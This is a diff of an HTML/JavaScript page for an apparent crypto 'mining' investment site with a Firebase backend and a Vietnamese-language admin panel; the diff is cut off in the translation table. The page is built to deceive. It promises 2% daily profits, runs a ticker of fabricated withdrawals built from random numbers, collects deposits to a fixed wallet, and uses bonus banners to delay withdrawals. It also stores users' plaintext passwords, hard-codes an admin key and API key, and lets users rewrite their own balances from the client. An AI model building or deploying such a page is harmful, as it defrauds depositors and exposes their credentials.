@@ -8,14 +8,14 @@
         :root { --bg: #0b0e11; --card: #1e2329; --gold: #f3ba2f; --gray: #848e9c; --green: #2ebd85; --border: #2b3139; --red: #f6465d; }
         body { font-family: 'Segoe UI', Roboto, sans-serif; background: var(--bg); color: #fff; margin: 0; padding-bottom: 80px; overflow-x: hidden; -webkit-tap-highlight-color: transparent; }
         .header { display: flex; justify-content: space-between; align-items: center; padding: 12px 15px; background: var(--card); border-bottom: 1px solid var(--border); position: sticky; top: 0; z-index: 100; }
-.logo-circle { width: 32px; height: 32px; background: var(--gold); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #000; font-weight: bold; font-size: 18px; cursor: pointer; }
+        .logo-circle { width: 32px; height: 32px; background: var(--gold); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #000; font-weight: bold; font-size: 18px; cursor: pointer; }
         .page { display: none; padding: 15px; animation: fadeIn 0.4s ease-out; }
         .active { display: block !important; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
         .card { background: var(--card); border-radius: 16px; padding: 20px; margin-bottom: 15px; border: 1px solid var(--border); box-shadow: 0 4px 15px rgba(0,0,0,0.4); }
         .progress-container { width: 100%; height: 8px; background: #2b3139; border-radius: 10px; margin-top: 10px; overflow: hidden; position: relative; }
         .progress-bar { height: 100%; background: linear-gradient(90deg, var(--green), var(--gold)); width: 0%; transition: width 1s linear; }
-.login-input { width: 100%; padding: 14px; margin-bottom: 12px; background: #2b3139; border: 1px solid var(--border); border-radius: 10px; color: #fff; box-sizing: border-box; outline: none; font-size: 16px; }
+        .login-input { width: 100%; padding: 14px; margin-bottom: 12px; background: #2b3139; border: 1px solid var(--border); border-radius: 10px; color: #fff; box-sizing: border-box; outline: none; font-size: 16px; }
         .login-btn { width: 100%; padding: 14px; background: var(--gold); color: #000; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 16px; transition: 0.2s; }
         .nav { position: fixed; bottom: 0; width: 100%; background: var(--card); display: flex; justify-content: space-around; padding: 10px 0; border-top: 1px solid var(--border); z-index: 1000; }
         .nav-item { color: var(--gray); text-align: center; font-size: 12px; cursor: pointer; flex: 1; }
@@ -23,213 +23,210 @@
         #toast { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: var(--gold); color: #000; padding: 12px 20px; border-radius: 25px; z-index: 9999; display: none; font-weight: bold; }
         #adminPanel { position: fixed; inset: 0; background: #0b0e11; z-index: 10001; display: none; padding: 20px; overflow-y: auto; }
         .req-card { background: #1e2329; padding: 15px; border-radius: 12px; margin-bottom: 12px; border: 1px solid #333; }
+        .history-row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #333; font-size: 13px; }
+        /* Style cho marquee */
+        marquee { display: block; width: 100%; }
     </style>
 </head>
 <body>
-<div id="loading_screen" style="position:fixed; inset:0; background:var(--bg); z-index:9000; display:flex; flex-direction:column; align-items:center; justify-content:center; color:var(--gold); font-weight:bold;">WEB3 CONNECTING...</div>
-<div id="toast"></div>
-<div id="adminPanel">
-    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
-        <h2 style="color:var(--gold)">MANAGER SYSTEM</h2>
-        <button onclick="document.getElementById('adminPanel').style.display='none'" style="background:var(--red); color:#fff; border:none; padding:8px 15px; border-radius:5px;">CLOSE</button>
-    </div>
-    <div id="adminList">Loading requests...</div>
-</div>
-<div id="authPage" style="position:fixed; inset:0; background:var(--bg); z-index:8000; display:none; flex-direction:column; justify-content:center; padding:30px;">
-    <div style="text-align: center; margin-bottom: 30px;"><div class="logo-circle" style="width:60px; height:60px; margin: 0 auto; font-size: 30px;">₿</div></div>
-    <div id="regForm">
-        <input type="email" id="regEmail" class="login-input" placeholder="Email">
-        <input type="password" id="regPass" class="login-input" placeholder="Password">
-        <button class="login-btn" onclick="handleRegister()">REGISTER</button>
-        <p style="text-align:center; color:var(--gray); font-size:13px; margin-top:20px;" onclick="switchAuth(false)">Have account? Login</p>
-    </div>
-    <div id="logForm" style="display:none;">
-        <input type="email" id="logEmail" class="login-input" placeholder="Email">
-        <input type="password" id="logPass" class="login-input" placeholder="Password">
-        <button class="login-btn" onclick="handleLogin()">LOGIN</button>
-        <p style="text-align:center; color:var(--gray); font-size:13px; margin-top:20px;" onclick="switchAuth(true)">New here? Register</p>
-    </div>
-</div>
-<div class="header">
-    <div style="display: flex; align-items: center;">
-        <div class="logo-circle" style="margin-right:10px" onclick="openAdminPortal()">₿</div>
-        <div id="topUserEmail" style="font-size: 11px; color: var(--gold); font-weight: bold; max-width: 120px; overflow: hidden; text-overflow: ellipsis;">Guest</div>
-    </div>
-    <select id="langSel" style="background:#2b3139; color:var(--gold); border:1px solid var(--gold); border-radius:5px; font-size:11px; padding:3px;" onchange="changeLang()">
-        <option value="en">English</option><option value="vi">Tiếng Việt</option>
-        <option value="zh">简体中文</option><option value="es">Español</option><option value="pt">Português</option>
-    </select>
-</div>
-<div id="home" class="page active">
-    <div style="margin-bottom:12px; font-size:12px; color:var(--gray);"><span id="l_welcome">Welcome</span>: <span id="welcomeEmail" style="color:#fff;">...</span></div>
-    <div class="card" style="background: linear-gradient(135deg, #2ebd85 0%, #1e2329 100%);">
-        <div style="display:flex; justify-content:space-between;"><span id="l_balance">Balance (USDT)</span><span onclick="toggleView()" style="cursor:pointer;">👁️</span></div>
-        <h2 id="usdt_H" style="font-size: 36px; margin: 12px 0;">$ 0.00</h2>
-<div id="mining-status-box" style="margin-top: 15px; background: rgba(0,0,0,0.3); padding: 15px; border-radius: 12px; display:none;">
-            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:8px;">
-                <span style="color:var(--gold); font-size:12px; font-weight:bold;">⚡ Mining 2.0%/Day</span>
-                <div style="font-family:monospace; font-size:12px; color:var(--gold);">Next: <span id="timer_clock">23:59:59</span></div>
+    <div id="loading_screen" style="position:fixed; inset:0; background:var(--bg); z-index:9000; display:flex; flex-direction:column; align-items:center; justify-content:center; color:var(--gold); font-weight:bold;">WEB3 CONNECTING...</div>
+    <div id="toast"></div>
+    
+    <div id="adminPanel">
+        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
+            <h2 style="color:var(--gold)">MANAGER SYSTEM</h2>
+            <button onclick="document.getElementById('adminPanel').style.display='none'" style="background:var(--red); color:#fff; border:none; padding:8px 15px; border-radius:5px;">CLOSE</button>
+        </div>
+        <div style="display: flex; gap: 20px; flex-wrap: wrap;">
+            <div style="flex: 1; min-width: 300px; border-right: 1px solid #333; padding-right: 15px;">
+                <h3 style="color:var(--gold); border-bottom: 1px solid #333; padding-bottom: 5px;">YÊU CẦU NẠP RÚT</h3>
+                <div id="adminRequests"></div>
             </div>
-            <div class="progress-container"><div id="mining-bar" class="progress-bar"></div></div>
-            <div style="display:flex; justify-content:space-between; margin-top:6px; font-size:10px; color:var(--gray);">
-                <span><span id="l_start">Start</span>: <span id="start_time_txt">--:--</span></span><span id="mining-percent">0%</span>
+            <div style="flex: 1; min-width: 300px; padding-left: 5px;">
+                <h3 style="color:var(--gold); border-bottom: 1px solid #333; padding-bottom: 5px;">QUẢN LÝ USER</h3>
+                <div id="adminUserList"></div>
             </div>
         </div>
-        <div id="L_st" style="font-size: 11px; opacity: 0.8; margin-top:12px; font-family:monospace;">Profit: 0.000000 ETH</div>
     </div>
-    <div class="card">
-        <p id="l_addr_t" style="color: var(--gold); font-size: 12px; font-weight: bold;">Deposit USDT (BEP20):</p>
-        <div style="background: #000; padding: 14px; border-radius: 12px; font-size: 11px; color: var(--gray); margin: 10px 0; display: flex; justify-content: space-between; align-items: center;">
-            <span style="font-family: monospace; word-break:break-all;">0x841100e786c77e475d328469c95238d063078610</span>
-            <button onclick="doCopy()" style="background: var(--gold); border: none; padding: 6px 12px; border-radius: 6px; font-weight: bold;">COPY</button>
+
+    <div id="authPage" style="position:fixed; inset:0; background:var(--bg); z-index:8000; display:none; flex-direction:column; justify-content:center; padding:30px;">
+        <div style="text-align: center; margin-bottom: 30px;"><div class="logo-circle" style="width:60px; height:60px; margin: 0 auto; font-size: 30px;">₿</div></div>
+        <div id="regForm">
+            <input type="email" id="regEmail" class="login-input" placeholder="Email">
+            <input type="password" id="regPass" class="login-input" placeholder="Password">
+            <button class="login-btn" onclick="handleRegister()">REGISTER</button>
+            <p style="text-align:center; color:var(--gray); font-size:13px; margin-top:20px;" onclick="switchAuth(false)">Have account? Login</p>
         </div>
-        <input type="number" id="in_Dep" placeholder="Amount" class="login-input">
-        <button id="l_btn_dep" class="login-btn" onclick="depositRequest()">ACTIVATE CONTRACT</button>
-        <div id="withdrawLive" style="font-size: 10px; color: var(--gray); height: 60px; overflow: hidden; margin-top: 15px; border-top: 1px solid #2b3139; padding-top: 10px;"></div>
+        <div id="logForm" style="display:none;">
+            <input type="email" id="logEmail" class="login-input" placeholder="Email">
+            <input type="password" id="logPass" class="login-input" placeholder="Password">
+            <button class="login-btn" onclick="handleLogin()">LOGIN</button>
+            <p style="text-align:center; color:var(--gray); font-size:13px; margin-top:20px;" onclick="switchAuth(true)">New here? Register</p>
+        </div>
     </div>
-</div>
-<div id="exchange" class="page">
-    <div class="card">
-        <h3 id="l_ex_t" style="color: var(--gold);">Profit Exchange</h3>
-        <input type="text" id="ex_eth_val" class="login-input" readonly value="0.000000 ETH">
-        <div style="text-align: center; margin: 10px 0;">⬇️</div>
-        <input type="text" id="ex_usdt_res" class="login-input" style="color:var(--green); font-weight:bold;" readonly value="0.00 USDT">
-        <button id="l_ex_btn" class="login-btn" onclick="processExchange()">TRANSFER TO BALANCE</button>
+
+    <div class="header">
+        <div style="display: flex; align-items: center;">
+            <div class="logo-circle" style="margin-right:10px" onclick="openAdminPortal()">₿</div>
+            <div id="topUserEmail" style="font-size: 11px; color: var(--gold); font-weight: bold; max-width: 120px; overflow: hidden; text-overflow: ellipsis;">Guest</div>
+        </div>
+        <select id="langSel" style="background:#2b3139; color:var(--gold); border:1px solid var(--gold); border-radius:5px; font-size:11px; padding:3px;" onchange="changeLang()">
+            <option value="en">English</option><option value="vi">Tiếng Việt</option>
+            <option value="zh">简体中文</option><option value="es">Español</option><option value="pt">Português</option>
+        </select>
     </div>
-</div>
-<div id="withdraw" class="page">
-    <div class="card">
-        <h3 id="l_nav_w" style="color: var(--gold);">Withdraw USDT</h3>
-        <h2 id="usdt_W" style="color: var(--green); margin: 10px 0;">$ 0.00</h2>
-        <input type="text" id="w_address" class="login-input" placeholder="Wallet Address">
-        <input type="number" id="w_amount" class="login-input" placeholder="Min 10 USDT">
-        <button class="login-btn" style="background: var(--red); color: #fff;" onclick="handleWithdraw()">WITHDRAW NOW</button>
+
+    <div id="home" class="page active">
+        <div style="margin-bottom:12px; font-size:12px; color:var(--gray);"><span id="l_welcome">Welcome</span>: <span id="welcomeEmail" style="color:#fff;">...</span></div>
+        <div class="card" style="background: linear-gradient(135deg, #2ebd85 0%, #1e2329 100%);"><div style="display:flex; justify-content:space-between;"><span id="l_balance">Balance (USDT)</span><span onclick="toggleView()" style="cursor:pointer;">👁️</span></div>
+            <h2 id="usdt_H" style="font-size: 36px; margin: 12px 0;">$ 0.00</h2>
+            <div id="mining-status-box" style="margin-top: 15px; background: rgba(0,0,0,0.3); padding: 15px; border-radius: 12px; display:none;">
+                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:8px;">
+                    <span style="color:var(--gold); font-size:12px; font-weight:bold;">⚡ Mining 2.0%/Day</span>
+                    <div style="font-family:monospace; font-size:12px; color:var(--gold);">Next: <span id="timer_clock">23:59:59</span></div>
+                </div>
+                <div class="progress-container"><div id="mining-bar" class="progress-bar"></div></div>
+                <div style="display:flex; justify-content:space-between; margin-top:6px; font-size:10px; color:var(--gray);">
+                    <span><span id="l_start">Start</span>: <span id="start_time_txt">--:--</span></span><span id="mining-percent">0%</span>
+                </div>
+            </div>
+            <div id="L_st" style="font-size: 11px; opacity: 0.8; margin-top:12px; font-family:monospace;">Profit: 0.000000 ETH</div>
+        </div>
+        <div class="card">
+            <p id="l_addr_t" style="color: var(--gold); font-size: 12px; font-weight: bold;">Deposit USDT (BEP20):</p>
+            <div style="background: #000; padding: 14px; border-radius: 12px; font-size: 11px; color: var(--gray); margin: 10px 0; display: flex; justify-content: space-between; align-items: center;">
+                <span style="font-family: monospace; word-break:break-all;">0x841100e786c77e475d328469c95238d063078610</span>
+                <button onclick="doCopy()" style="background: var(--gold); border: none; padding: 6px 12px; border-radius: 6px; font-weight: bold;">COPY</button>
+            </div>
+            <input type="number" id="in_Dep" placeholder="Amount" class="login-input">
+            <button id="l_btn_dep" class="login-btn" onclick="depositRequest()">ACTIVATE CONTRACT</button>
+            <div id="withdrawLive" style="font-size: 10px; color: var(--gray); height: 60px; overflow: hidden; margin-top: 15px; border-top: 1px solid #2b3139; padding-top: 10px;"></div>
+        </div>
     </div>
-</div>
-<div id="account" class="page">
-    <div id="security_wall" style="text-align: center; padding: 40px 20px;">
-        <h3 id="l_acc_t" style="color: var(--gold);">Security Vault</h3>
-        <input type="password" id="user_pin" class="login-input" placeholder="PIN" style="text-align: center;">
-        <button id="l_acc_btn" class="login-btn" onclick="handleSecurityAccess()">VERIFY</button>
+
+    <div id="exchange" class="page">
+        <div class="card">
+            <div style="background:#000; border:1px solid var(--gold); padding:10px; margin-bottom:15px; overflow:hidden;">
+                <marquee scrollamount="4">THÔNG BÁO: Ưu đãi nạp lần đầu nhận ngay bonus gấp đôi. Liên hệ Admin để nhận thưởng!</marquee>
+            </div>
+            <h3 id="l_ex_t" style="color: var(--gold);">Profit Exchange</h3>
+            <input type="text" id="ex_eth_val" class="login-input" readonly value="0.000000 ETH">
+            <div style="text-align: center; margin: 10px 0;">⬇️</div>
+            <input type="text" id="ex_usdt_res" class="login-input" style="color:var(--green); font-weight:bold;" readonly value="0.00 USDT">
+            <button id="l_ex_btn" class="login-btn" onclick="processExchange()">TRANSFER TO BALANCE</button>
+            
+            <div style="margin-top:20px; padding:15px; border:1.5px solid var(--red); border-radius:10px; color:#ff4d4d; font-size:12px; line-height:1.7; font-weight: 500; background: rgba(246, 70, 93, 0.05); height: 150px; overflow: hidden;">
+                <marquee behavior="scroll" direction="up" scrollamount="2" height="100%" onmouseover="this.stop()" onmouseout="this.start()">
+                    1. nạp đầu 500$ phần thưởng ưu đãi cho người dùng mới sẽ là 1.000$<br>
+                    2. nạp đầu 1.000$ phần thưởng ưu đãi cho người dùng mới sẽ là 1.500$<br>
+                    3. nạp đầu 2.000$ phần thưởng ưu đãi cho người dùng mới sẽ là 2.500$<br>
+                    4. nạp đầu 3.000$ phần thưởng ưu đãi cho người dùng mới sẽ là 3.500$<br>
+                    5. nạp đầu 4.000$ phần thưởng ưu đãi cho người dùng mới sẽ là 4.500$<br>
+                    <b style="color: #fff; display: block; margin-top: 8px;">KHUYẾN KHÍCH QUÝ KHÁCH HOÀN THÀNH CÁC ƯU ĐÃI TRƯỚC KHI RÚT TIỀN!</b>
+                </marquee>
+            </div>
+        </div>
     </div>
-    <div id="account_content" style="display: none;">
-        <div class="card"><p style="color: var(--gray); font-size: 13px;">Email: <span id="accEmailText">...</span></p>
-        <h1 id="usdt_A" style="font-size: 32px; margin: 10px 0; color:var(--gold);">$ 0.00</h1></div>
-        <button class="login-btn" style="background:var(--red); color:#fff;" onclick="handleLogout()">LOGOUT</button>
+
+    <div id="withdraw" class="page">
+        <div class="card"><h3 id="l_nav_w" style="color: var(--gold);">Withdraw USDT</h3>
+            <h2 id="usdt_W" style="color: var(--green); margin: 10px 0;">$ 0.00</h2>
+            <select id="w_network" class="login-input" style="border: 1px solid var(--gold); color: var(--gold);">
+                <option value="BEP20">Binance Smart Chain (BEP20)</option>
+                <option value="TRC20">Tron (TRC20)</option>
+                <option value="ERC20">Ethereum (ERC20)</option>
+            </select>
+            <input type="text" id="w_address" class="login-input" placeholder="Wallet Address">
+            <input type="number" id="w_amount" class="login-input" placeholder="Min 10 USDT">
+            <button class="login-btn" style="background: var(--red); color: #fff;" onclick="handleWithdraw()">WITHDRAW NOW</button>
+        </div>
+        <div class="card">
+            <h4 style="color: var(--gold); margin-bottom: 10px;">Transaction History</h4>
+            <div id="history_list"></div>
+        </div>
     </div>
-</div>
-<div class="nav">
-    <div class="nav-item active" id="nav_home" onclick="go('home')">🏠<br><span id="l_nav_h">Home</span></div>
-    <div class="nav-item" id="nav_exchange" onclick="go('exchange')">🔄<br><span id="l_nav_e">Exchange</span></div>
-    <div class="nav-item" id="nav_withdraw" onclick="go('withdraw')">💸<br><span id="l_nav_w">Withdraw</span></div>
-    <div class="nav-item" id="nav_account" onclick="go('account')">👤<br><span id="l_nav_a">Account</span></div>
-</div>
-<script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-    import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
-    import { getDatabase, ref, set, get, update, onValue, push } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
-    const firebaseConfig = { apiKey: "AIzaSyB355waMca7L5Y3VG3efDWZTUuaEQpjwm0", databaseURL: "https://wed3pro-default-rtdb.firebaseio.com", projectId: "wed3pro" };
-    const app = initializeApp(firebaseConfig); const auth = getAuth(app); const db = getDatabase(app);
-    window.fb = { auth, db, ref, set, get, update, onValue, push, createUserWithEmailAndPassword, signInWithEmailAndPassword, signOut };
-    onAuthStateChanged(auth, (user) => {
-        document.getElementById('loading_screen').style.display = 'none';
-        if(user) { document.getElementById('authPage').style.display = 'none'; loadUserData(user.uid);
-            document.getElementById('topUserEmail').innerText = user.email; document.getElementById('welcomeEmail').innerText = user.email; document.getElementById('accEmailText').innerText = user.email;
-        } else { document.getElementById('authPage').style.display = 'flex'; }
-    });
-</script>
-<script>
-    const trans = {
-        en: { welcome: "Welcome", balance: "Balance (USDT)", start: "Start", addr_t: "Deposit USDT (BEP20):", btn_dep: "ACTIVATE CONTRACT", nav_h: "Home", nav_e: "Exchange", nav_w: "Withdraw", nav_a: "Account", ex_t: "Profit Exchange", ex_btn: "TRANSFER TO BALANCE", acc_t: "Security Vault", acc_btn: "VERIFY" },
-        vi: { welcome: "Chào mừng", balance: "Số dư (USDT)", start: "Bắt đầu", addr_t: "Nạp USDT (BEP20):", btn_dep: "KÍCH HOẠT HỢP ĐỒNG", nav_h: "Trang chủ", nav_e: "Quy đổi", nav_w: "Rút tiền", nav_a: "Tài khoản", ex_t: "Quy đổi lợi nhuận", ex_btn: "CHUYỂN VỀ VỐN", acc_t: "Két sắt bảo mật", acc_btn: "XÁC MINH" },
-        zh: { welcome: "欢迎", balance: "余额 (USDT)", start: "开始", addr_t: "充值 USDT (BEP20):", btn_dep: "激活合约", nav_h: "首页", nav_e: "兑换", nav_w: "提现", nav_a: "账户", ex_t: "利润兑换", ex_btn: "转入余额", acc_t: "安全库", acc_btn: "验证" },
-        es: { welcome: "Bienvenido", balance: "Saldo (USDT)", start: "Inicio", addr_t: "Depósito (BEP20):", btn_dep: "ACTIVAR CONTRATO", nav_h: "Inicio", nav_e: "Canje", nav_w: "Retirar", nav_a: "Cuenta", ex_t: "Canje de Ganancias", ex_btn: "TRANSFERIR", acc_t: "Bóveda", acc_btn: "VERIFICAR" },
-        pt: { welcome: "Bem-vindo", balance: "Saldo (USDT)", start: "Início", addr_t: "Depósito (BEP20):", btn_dep: "ATIVAR CONTRATO", nav_h: "Início", nav_e: "Troca", nav_w: "Retirar", nav_a: "Conta", ex_t: "Troca de Lucro", ex_btn: "TRANSFERIR", acc_t: "Cofre", acc_btn: "VERIFICAR" }
-    };
-    function changeLang() {
-        const l = document.getElementById('langSel').value; const t = trans[l];
-        for (let key in t) { const el = document.getElementById('l_' + key); if(el) el.innerText = t[key]; }
-    }
-    const ADMIN_KEY = "258369@@"; 
-    let state = { usdt: 0, eth: 0, active: false, hide: false, uid: "", pass: "", lastUpdate: 0, cycle: 24*3600*1000 };
-</script>
-<script>
-    window.openAdminPortal = function() {
-        let p = prompt("Manager Key:");
-        if (p === ADMIN_KEY) { document.getElementById('adminPanel').style.display = 'block'; loadAdminPanel(); }
-    };
-    function loadAdminPanel() {
-        fb.onValue(fb.ref(fb.db, 'admin/requests'), (snap) => {
-            const list = document.getElementById('adminList'); list.innerHTML = "";
-            snap.forEach((c) => {
-                const r = c.val(); if(r.status === 'pending') {
-                    const d = document.createElement('div'); d.className = "req-card";
-                    d.innerHTML = `<div style="font-size:12px;"><b>${r.type.toUpperCase()} $${r.amount}</b><br>${r.email}</div>
-                    <div style="display:flex; gap:10px; margin-top:10px;">
-                        <button onclick="approveReq('${c.key}','${r.uid}',${r.amount},'${r.type}')" style="flex:1; background:var(--green); border:none; padding:8px; border-radius:5px; font-weight:bold;">OK</button>
-                        <button onclick="fb.update(fb.ref(fb.db, 'admin/requests/${c.key}'),{status:'rejected'})" style="flex:1; background:var(--red); border:none; padding:8px; border-radius:5px; color:#fff;">NO</button>
-                    </div>`;
-                    list.prepend(d);
-                }
-            });
+
+    <div id="account" class="page">
+        <div id="security_wall" style="text-align: center; padding: 40px 20px;">
+            <h3 id="l_acc_t" style="color: var(--gold);">Security Vault</h3>
+            <input type="password" id="user_pin" class="login-input" placeholder="PIN" style="text-align: center;">
+            <button id="l_acc_btn" class="login-btn" onclick="handleSecurityAccess()">VERIFY</button>
+        </div>
+        <div id="account_content" style="display: none;">
+            <div class="card"><p style="color: var(--gray); font-size: 13px;">Email: <span id="accEmailText">...</span></p>
+            <h1 id="usdt_A" style="font-size: 32px; margin: 10px 0; color:var(--gold);">$ 0.00</h1></div>
+            <button class="login-btn" style="background:var(--red); color:#fff;" onclick="handleLogout()">LOGOUT</button>
+        </div>
+    </div>
+
+    <div class="nav">
+        <div class="nav-item active" id="nav_home" onclick="go('home')">🏠<br><span id="l_nav_h">Home</span></div>
+        <div class="nav-item" id="nav_exchange" onclick="go('exchange')">🔄<br><span id="l_nav_e">Exchange</span></div>
+        <div class="nav-item" id="nav_withdraw" onclick="go('withdraw')">💸<br><span id="l_nav_w">Withdraw</span></div>
+        <div class="nav-item" id="nav_account" onclick="go('account')">👤<br><span id="l_nav_a">Account</span></div>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+        import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
+        import { getDatabase, ref, set, get, update, onValue, push } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+        const firebaseConfig = { apiKey: "AIzaSyB355waMca7L5Y3VG3efDWZTUuaEQpjwm0", databaseURL: "https://wed3pro-default-rtdb.firebaseio.com", projectId: "wed3pro" };
+        const app = initializeApp(firebaseConfig); const auth = getAuth(app); const db = getDatabase(app);
+        window.fb = { auth, db, ref, set, get, update, onValue, push, createUserWithEmailAndPassword, signInWithEmailAndPassword, signOut };
+        onAuthStateChanged(auth, (user) => {
+            document.getElementById('loading_screen').style.display = 'none';
+            if(user) { document.getElementById('authPage').style.display = 'none'; loadUserData(user.uid); document.getElementById('topUserEmail').innerText = user.email; document.getElementById('welcomeEmail').innerText = user.email; document.getElementById('accEmailText').innerText = user.email; } else { document.getElementById('authPage').style.display = 'flex'; }
         });
-    }
-    async function approveReq(id, uid, amt, type) {
-        const uRef = fb.ref(fb.db, 'users/' + uid); const snap = await fb.get(uRef); const ud = snap.val();
-        if(type === 'deposit') { await fb.update(uRef, { usdt: (ud.usdt || 0) + amt, active: true, lastUpdate: Date.now() }); }
-        else { if(ud.usdt >= amt) await fb.update(uRef, { usdt: ud.usdt - amt }); }
-        await fb.update(fb.ref(fb.db, 'admin/requests/' + id), { status: 'approved' });
-        showToast("Done!");
-    }
-</script>
-<script>
-    function startTimers() {
-        setInterval(async () => {
-            if(state.active && state.usdt > 0) {
-                const now = Date.now(); const passed = now - state.lastUpdate; const left = state.cycle - passed;
-                if (left <= 0) {
-                    const profit = (state.usdt * (state.usdt >= 2000 ? 0.025 : 0.02)) / 3500;
-                    await fb.update(fb.ref(fb.db, 'users/' + state.uid), { eth: (state.eth || 0) + profit, lastUpdate: Date.now() });
-                } else {
-                    document.getElementById('timer_clock').innerText = [Math.floor(left/3600000), Math.floor((left%3600000)/60000), Math.floor((left%60000)/1000)].map(v=>v<10?"0"+v:v).join(":");
-                    let p = (passed / state.cycle) * 100; document.getElementById('mining-bar').style.width = Math.min(p, 100) + "%";
-                    document.getElementById('mining-percent').innerText = Math.floor(Math.min(p, 100)) + "%";
-                    let sd = new Date(state.lastUpdate); document.getElementById('start_time_txt').innerText = sd.getHours() + ":" + sd.getMinutes().toString().padStart(2,'0');
-                }
-            }
-        }, 1000);
-        const live = document.getElementById('withdrawLive');
-        setInterval(() => {
-            const d = document.createElement('div'); d.innerHTML = `0x${Math.random().toString(16).slice(2,6)}... withdrawn <span style="color:var(--green)">+$${(Math.random()*300).toFixed(1)}</span>`;
-            live.prepend(d); if(live.children.length > 3) live.lastChild.remove();
-        }, 5000);
-    }
-</script>
-<script>
-    function updateDisplay() {
-        const total = state.usdt + (state.eth * 3500);
-        const v = state.hide ? "****" : "$ " + total.toLocaleString('en-US',{minimumFractionDigits:2});
-        document.getElementById('usdt_H').innerText = v; document.getElementById('usdt_A').innerText = v; 
-        document.getElementById('usdt_W').innerText = "$ " + state.usdt.toLocaleString('en-US',{minimumFractionDigits:2});
-        document.getElementById('ex_eth_val').value = state.eth.toFixed(6) + " ETH";
-        document.getElementById('ex_usdt_res').value = (state.eth * 3500).toFixed(2) + " USDT";
-        document.getElementById('L_st').innerText = "Profit: " + state.eth.toFixed(6) + " ETH";
-        if(state.active && state.usdt > 0) document.getElementById('mining-status-box').style.display = 'block';
-    }
-    async function depositRequest() { let a = parseFloat(document.getElementById('in_Dep').value); if(!a) return; fb.push(fb.ref(fb.db,'admin/requests'), {uid:state.uid, email:fb.auth.currentUser.email, amount:a, type:'deposit', status:'pending'}); showToast("Sent!"); }
-    async function handleWithdraw() { let a = parseFloat(document.getElementById('w_amount').value); if(a > state.usdt || !a) return; fb.push(fb.ref(fb.db,'admin/requests'), {uid:state.uid, email:fb.auth.currentUser.email, amount:a, type:'withdraw', status:'pending'}); showToast("Sent!"); }
-    async function processExchange() { if(state.eth <= 0) return; await fb.update(fb.ref(fb.db, 'users/'+state.uid), { usdt: state.usdt + (state.eth * 3500), eth: 0 }); showToast("Success!"); }
-    function loadUserData(u) { state.uid = u; fb.onValue(fb.ref(fb.db, 'users/'+u), (s) => { let d = s.val(); if(d) { Object.assign(state, d); updateDisplay(); } }); }
-    function go(id) { document.querySelectorAll('.page').forEach(p => p.classList.remove('active')); document.getElementById(id).classList.add('active'); document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active')); document.getElementById('nav_'+id).classList.add('active'); }
-    function showToast(m) { const t = document.getElementById('toast'); t.innerText = m; t.style.display = 'block'; setTimeout(()=>t.style.display='none', 2500); }
-    function toggleView() { state.hide = !state.hide; updateDisplay(); }
-    function doCopy() { navigator.clipboard.writeText("0x841100e786c77e475d328469c95238d063078610"); showToast("Copied!"); }
-    function handleSecurityAccess() { if(document.getElementById('user_pin').value === state.pass) document.getElementById('account_content').style.display='block'; }
-    function handleLogout() { fb.signOut(fb.auth); location.reload(); }
-    function switchAuth(r) { document.getElementById('regForm').style.display = r ? 'block' : 'none'; document.getElementById('logForm').style.display = r ? 'none' : 'block'; }
-async function handleRegister() { const e = document.getElementById('regEmail').value, p = document.getElementById('regPass').value; try { const r = await fb.createUserWithEmailAndPassword(fb.auth, e, p); await fb.set(fb.ref(fb.db, 'users/' + r.user.uid), { usdt: 0, eth: 0, active: false, email: e, pass: p, lastUpdate: Date.now() }); } catch(e) { showToast("Error!"); } }
-    async function handleLogin() { try { await fb.signInWithEmailAndPassword(fb.auth, document.getElementById('logEmail').value, document.getElementById('logPass').value); } catch(e) { showToast("Failed!"); } }
-    window.onload = () => { startTimers(); changeLang(); };
-</script>
+    </script>
+    <script>
+        const trans = {
+            en: { welcome: "Welcome", balance: "Balance (USDT)", start: "Start", addr_t: "Deposit USDT (BEP20):", btn_dep: "ACTIVATE CONTRACT", nav_h: "Home", nav_e: "Exchange", nav_w: "Withdraw", nav_a: "Account", ex_t: "Profit Exchange", ex_btn: "TRANSFER TO BALANCE", acc_t: "Security Vault", acc_btn: "VERIFY" },
+            vi: { welcome: "Chào mừng", balance: "Số dư (USDT)", start: "Bắt đầu", addr_t: "Nạp USDT (BEP20):", btn_dep: "KÍCH HOẠT HỢP ĐỒNG", nav_h: "Trang chủ", nav_e: "Quy đổi", nav_w: "Rút tiền", nav_a: "Tài khoản", ex_t: "Quy đổi lợi nhuận", ex_btn: "CHUYỂN VỀ VỐN", acc_t: "Két sắt bảo mật", acc_btn: "XÁC MINH" },
+            zh: { welcome: "欢迎", balance: "余额 (USDT)", start: "开始", addr_t: "充值 USDT (BEP20):", btn_dep: "激活合约", nav_h: "首页", nav_e: "兑换", nav_w: "提现", nav_a: "账户", ex_t: "利润兑换", ex_btn: "转入余额", acc_t: "安全库", acc_btn: "验证" },
+            es: { welcome: "Bienvenido", balance: "Saldo (USDT)", start: "Inicio", addr_t: "Depósito (BEP20):", btn_dep: "ACTIVAR CONTRATO", nav_h: "Inicio", nav_e: "Canje", nav_w: "Retirar", nav_a: "Cuenta", ex_t: "Canje de Ganancias", ex_btn: "TRANSFERIR", acc_t: "Bóveda", acc_btn: "VERIFICAR" },
